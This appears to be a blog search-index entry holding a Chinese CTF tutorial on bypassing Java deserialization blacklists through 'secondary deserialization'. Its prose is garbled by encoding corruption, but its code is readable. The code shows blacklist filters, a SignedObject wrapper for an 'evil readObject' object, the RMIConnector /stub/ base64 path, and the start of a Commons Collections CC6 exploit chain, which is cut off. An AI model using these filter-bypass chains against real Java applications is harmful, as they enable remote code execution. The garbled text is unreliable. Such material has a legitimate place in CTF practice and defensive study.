<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>äºŒæ¬¡ååºåˆ—åŒ–</title>
    <link href="/2024/08/04/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/08/04/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p>å¾ˆå¤šjavaé¢˜ç›®ï¼Œå¤§éƒ½å¼„äº†ä¸ªç±»ç»§æ‰¿<code>ObjectInputStream</code>ï¼Œé‡å†™å…¶<code>resolveClass</code>æ–¹æ³•ï¼Œåœ¨é‡Œé¢æ·»åŠ å¯¹ååºåˆ—åŒ–ç±»é»‘åå•çš„æ ¡éªŒã€‚è¿™ä¹Ÿä¸ºæˆ‘AWDPä¿®javaé¢˜æä¾›äº†ä¸€äº›æ€è·¯ã€‚</p><p>æ¯”å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectInputStream</span> &#123;<br><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] blacklist = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<br>           <span class="hljs-string">&quot;java\\.security.*&quot;</span>, <span class="hljs-string">&quot;java\\.rmi.*&quot;</span>,  <span class="hljs-string">&quot;com\\.fasterxml.*&quot;</span>, <span class="hljs-string">&quot;com\\.ctf\\.*&quot;</span>,<br>           <span class="hljs-string">&quot;org\\.springframework.*&quot;</span>, <span class="hljs-string">&quot;org\\.yaml.*&quot;</span>, <span class="hljs-string">&quot;javax\\.management\\.remote.*&quot;</span><br>   &#125;;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyObjectInputStream</span><span class="hljs-params">(InputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>      <span class="hljs-built_in">super</span>(inputStream);<br>   &#125;<br><br>   <span class="hljs-keyword">protected</span> Class <span class="hljs-title function_">resolveClass</span><span class="hljs-params">(ObjectStreamClass cls)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>      <span class="hljs-keyword">if</span>(!contains(cls.getName())) &#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(cls);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;Unexpected serialized class&quot;</span>, cls.getName());<br>      &#125;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">contains</span><span class="hljs-params">(String targetValue)</span> &#123;<br>      <span class="hljs-keyword">for</span> (String forbiddenPackage : blacklist) &#123;<br>         <span class="hljs-keyword">if</span> (targetValue.matches(forbiddenPackage))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>      &#125;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ–è¿™ç§ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyownObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectInputStream</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">ArrayList</span> <span class="hljs-variable">Blacklist</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyownObjectInputStream</span><span class="hljs-params">(InputStream in)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">super</span>(in);<br>        <span class="hljs-built_in">this</span>.Blacklist.add(Hashtable.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(HashSet.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(JdbcRowSetImpl.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(TreeMap.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(HotSwappableTargetSource.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(XString.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(BadAttributeValueExpException.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(TemplatesImpl.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(ToStringBean.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(<span class="hljs-string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.Blacklist.contains(desc.getName())) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;dont do this&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™äº›é»‘åå•ä¸­çš„ç±»åœ¨ååºåˆ—åŒ–ä¸­å½“ç„¶æ˜¯å¾ˆæœ‰ç”¨é€”çš„ã€‚</p><p>ä½†æ˜¯åœ¨æ¯”èµ›åšé¢˜çš„æ—¶å€™å°±å¾ˆçƒ¦äº†ï¼Œè‹¥æ²¡æœ‰ç§¯ç´¯å……è¶³çš„Javaååºåˆ—åŒ–åˆ©ç”¨é“¾ç»éªŒï¼Œå¾ˆéš¾ç»•ã€‚è€Œä¸”æ¯”èµ›æ—¶ä¸´æ—¶å»æ‰¾è§¦å‘ç±»ä¹ŸæŒºéš¾çš„ã€‚å°¤å…¶æ˜¯æ–­ç½‘çš„çº¿ä¸‹ç¯å¢ƒæ›´æ˜¯æŠ½è±¡ï¼Œç§ç§åŸå› ç”šè‡³ä½¿å¾—webé¢˜ç›®é‡ŒJavaååºåˆ—åŒ–åšå‡ºæ¥çš„è‚¯å®šæ˜¯æœ€å°‘çš„äººã€‚</p><p>Javaé¢˜å°±å˜æˆä¸€é“ç±»çš„æ’åˆ—ç»„åˆç¼åˆæ€ªäº†ğŸ¤¯ï¼Œæƒ³åŠæ³•ç¼å‡ºä¸€æ¡å¯ä»¥æ‰“é€šçš„åœ¨é»‘åå•ä¹‹å¤–çš„åˆ©ç”¨é“¾ã€‚</p><p>è¿™æ—¶å€™å°±å¯ä»¥è€ƒè™‘ä¸€ä¸‹äºŒæ¬¡ååºåˆ—åŒ–äº†ï¼Œä¸ç”¨ä½ å®šä¹‰çš„æ£€æµ‹é»‘åå•çš„<code>ObjectInputStream</code>å»åŠ è½½åºåˆ—åŒ–å¯¹è±¡ï¼Œè€Œæ˜¯æ‰¾åˆ°ä¸€æ¡å¯ä»¥è§¦å‘<code>readObject</code>çš„é“¾å­ï¼Œç”¨åŸç”Ÿçš„<code>ObjectInputStream</code>å»<code>resolveClass</code></p><h2 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h2><p>é‡åˆ°è¿‡ä¸”å®æ“è¿‡ä¸¤æ¬¡çš„å¥½ä¸œè¥¿ã€‚</p><p>å…³é”®åœ¨äº</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java.security.SignedObject#getObject<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç±»åœ¨<code>Hessian</code>ååºåˆ—åŒ–ä¸­ä¹Ÿç”¨è¿‡ï¼ˆHessiançš„ä¼šæ”¾åœ¨åé¢å†æ›´ï¼‰ï¼Œç”±äº<code>Hessian</code>ååºåˆ—åŒ–çš„ç‰¹æ®Šæ€§ï¼Œä¸ä¼šæ‰§è¡Œç±»çš„<code>readObject</code>æ¥ååºåˆ—åŒ–ï¼Œè€Œæ˜¯é€šè¿‡åå°„è·å–<code>field</code>å†å¡«å……è¿›ä¸€ä¸ªç©ºçš„å®ä¾‹åŒ–å¯¹è±¡ï¼Œ<code>_tfactory</code>åˆæ˜¯<code>transient</code>ä¿®é¥°ï¼Œ<code>writeObject</code>ä¸ä¼šå†™è¿›å»ï¼Œå¯¼è‡´<code>TemplatesImpl</code>ä¸èƒ½åˆ©ç”¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SignedObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">SignedObject</span><span class="hljs-params">(Serializable object, PrivateKey signingKey,</span><br><span class="hljs-params">                        Signature signingEngine)</span><br>        <span class="hljs-keyword">throws</span> IOException, InvalidKeyException, SignatureException &#123;<br>            <span class="hljs-comment">// creating a stream pipe-line, from a to b</span><br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(b);<br><br>            <span class="hljs-comment">// write and flush the object content to byte array</span><br>            a.writeObject(object);<br>            a.flush();<br>            a.close();<br>            <span class="hljs-built_in">this</span>.content = b.toByteArray();<br>            b.close();<br><br>            <span class="hljs-comment">// now sign the encapsulated object</span><br>            <span class="hljs-built_in">this</span>.sign(signingKey, signingEngine);<br>    &#125;<br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>    &#123;<br>        <span class="hljs-comment">// creating a stream pipe-line, from b to a</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(<span class="hljs-built_in">this</span>.content);<br>        <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(b);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> a.readObject();<br>        b.close();<br>        a.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è§¦å‘æ–¹å¼ï¼šèƒ½å¤Ÿæ‰§è¡Œç±»çš„<code>getter</code>æ–¹æ³•ï¼Œæ¯”å¦‚é…åˆ<code>ROME</code>æˆ–<code>FastJson</code>æ‰“ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">KeyPairGenerator keyPairGenerator;<br>keyPairGenerator = KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>keyPairGenerator.initialize(<span class="hljs-number">1024</span>);<br><span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.genKeyPair();<br><span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br><span class="hljs-type">Signature</span> <span class="hljs-variable">signingEngine</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br><br><span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(object_with_evil_readObject, privateKey, signingEngine);<br></code></pre></td></tr></table></figure><h2 id="SerializationUtils"><a href="#SerializationUtils" class="headerlink" title="SerializationUtils"></a>SerializationUtils</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.springframework.util.SerializationUtils.deserialize<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> <span class="hljs-type">byte</span>[] bytes)</span> &#123;<br>    <span class="hljs-keyword">if</span> (bytes == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">try</span> (<span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes))) &#123;<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125; <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="RMIConnector"><a href="#RMIConnector" class="headerlink" title="RMIConnector"></a>RMIConnector</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.management.remote.rmi.RMIConnector#findRMIServerJRMP<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> RMIServer <span class="hljs-title function_">findRMIServerJRMP</span><span class="hljs-params">(String base64, Map&lt;String, ?&gt; env, <span class="hljs-type">boolean</span> isIiop)</span><br>    <span class="hljs-keyword">throws</span> IOException &#123;<br><br>    <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] serialized;<br>    <span class="hljs-keyword">try</span> &#123;<br>        serialized = base64ToByteArray(base64);<br>    &#125; <span class="hljs-comment">//....</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bin</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(serialized);<br><br>    <span class="hljs-keyword">final</span> <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> EnvHelp.resolveClientClassLoader(env);<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">oin</span> <span class="hljs-operator">=</span><br>        (loader == <span class="hljs-literal">null</span>) ?<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bin) :<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStreamWithLoader</span>(bin, loader);<br>    <span class="hljs-keyword">final</span> Object stub;<br>    <span class="hljs-keyword">try</span> &#123;<br>        stub = oin.readObject();<br>    &#125; <span class="hljs-comment">// ....</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è‹¥èƒ½æ§åˆ¶base64å‚æ•°çš„å†…å®¹å°±å¯ä»¥ä»»æ„ååºåˆ—åŒ–ã€‚</p><p>å¾€ä¸Šå›æº¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> RMIServer <span class="hljs-title function_">findRMIServer</span><span class="hljs-params">(JMXServiceURL directoryURL,</span><br><span class="hljs-params">                                Map&lt;String, Object&gt; environment)</span> &#123;<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">isIiop</span> <span class="hljs-operator">=</span> RMIConnectorServer.isIiopURL(directoryURL,<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">if</span> (isIiop) &#123;<br>        <span class="hljs-comment">// Make sure java.naming.corba.orb is in the Map.</span><br>        environment.put(EnvHelp.DEFAULT_ORB,resolveOrb(environment));<br>    &#125;<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> directoryURL.getURLPath();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> path.indexOf(<span class="hljs-string">&#x27;;&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (end &lt; <span class="hljs-number">0</span>) end = path.length();<br>    <span class="hljs-keyword">if</span> (path.startsWith(<span class="hljs-string">&quot;/jndi/&quot;</span>))<br>        <span class="hljs-keyword">return</span> findRMIServerJNDI(path.substring(<span class="hljs-number">6</span>,end), environment, isIiop);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (path.startsWith(<span class="hljs-string">&quot;/stub/&quot;</span>))<br>        <span class="hljs-keyword">return</span> findRMIServerJRMP(path.substring(<span class="hljs-number">6</span>,end), environment, isIiop);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (path.startsWith(<span class="hljs-string">&quot;/ior/&quot;</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (!IIOPHelper.isAvailable())<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;iiop protocol not available&quot;</span>);<br>        <span class="hljs-keyword">return</span> findRMIServerIIOP(path.substring(<span class="hljs-number">5</span>,end), environment, isIiop);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;URL path must begin with /jndi/ or /stub/ &quot;</span> +<br>            <span class="hljs-string">&quot;or /ior/: &quot;</span> + path;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MalformedURLException</span>(msg);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>path</code>ä»¥<code>/stub/</code>å¼€å¤´å°±èƒ½è¿›åˆ°<code>findRMIServerJRMP</code>ï¼Œ<code>path</code>ä¸­<code>/stub/</code>ä¸ºåºåˆ—åŒ–å­—èŠ‚çš„base64ç¼–ç </p><p><code>path</code>ç”±<code>directoryURL#getURLPath</code>å¾—åˆ°</p><p>åœ¨å¾€ä¸Šå‘ç°<code>connect</code>å’Œ<code>doStart</code>è°ƒç”¨äº†<code>findRMIServer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connect</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        connect(<span class="hljs-literal">null</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">connect</span><span class="hljs-params">(Map&lt;String,?&gt; environment)</span> &#123;<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">tracing</span> <span class="hljs-operator">=</span> logger.traceOn();<br>    <span class="hljs-type">String</span>        <span class="hljs-variable">idstr</span>   <span class="hljs-operator">=</span> (tracing?<span class="hljs-string">&quot;[&quot;</span>+<span class="hljs-built_in">this</span>.toString()+<span class="hljs-string">&quot;]&quot;</span>:<span class="hljs-literal">null</span>);<br><br>    <span class="hljs-keyword">if</span> (terminated) &#123;<br>        logger.trace(<span class="hljs-string">&quot;connect&quot;</span>,idstr + <span class="hljs-string">&quot; already closed.&quot;</span>);<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;Connector closed&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (connected) &#123;<br>        logger.trace(<span class="hljs-string">&quot;connect&quot;</span>,idstr + <span class="hljs-string">&quot; already connected.&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; usemap =<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;((<span class="hljs-built_in">this</span>.env==<span class="hljs-literal">null</span>) ?<br>                                        Collections.&lt;String, Object&gt;emptyMap() : <span class="hljs-built_in">this</span>.env);<br><br>        <span class="hljs-keyword">if</span> (environment != <span class="hljs-literal">null</span>) &#123;<br>            EnvHelp.checkAttributes(environment);<br>            usemap.putAll(environment);<br>        &#125;<br><br>        <span class="hljs-comment">// Get RMIServer stub from directory or URL encoding if needed.</span><br>        <span class="hljs-keyword">if</span> (tracing) logger.trace(<span class="hljs-string">&quot;connect&quot;</span>,idstr + <span class="hljs-string">&quot; finding stub...&quot;</span>);<br>        <span class="hljs-type">RMIServer</span> <span class="hljs-variable">stub</span> <span class="hljs-operator">=</span> (rmiServer!=<span class="hljs-literal">null</span>)?rmiServer:<br>        findRMIServer(jmxServiceURL, usemap);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doStart</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-comment">// Get RMIServer stub from directory or URL encoding if needed.</span><br>    RMIServer stub;<br>    <span class="hljs-keyword">try</span> &#123;<br>        stub = (rmiServer!=<span class="hljs-literal">null</span>)?rmiServer:<br>        findRMIServer(jmxServiceURL, env);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨CCé“¾çš„<code>InvokerTransformer</code>æ¥è§¦å‘<code>connect</code>ï¼ˆ<code>doStart</code>è¢«<code>protected</code>ä¿®é¥°ï¼Œä¸èƒ½ç”¨<code>InvokerTransformer</code>è§¦å‘ï¼‰ï¼š</p><p>ä»¥CC6ä¸ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span 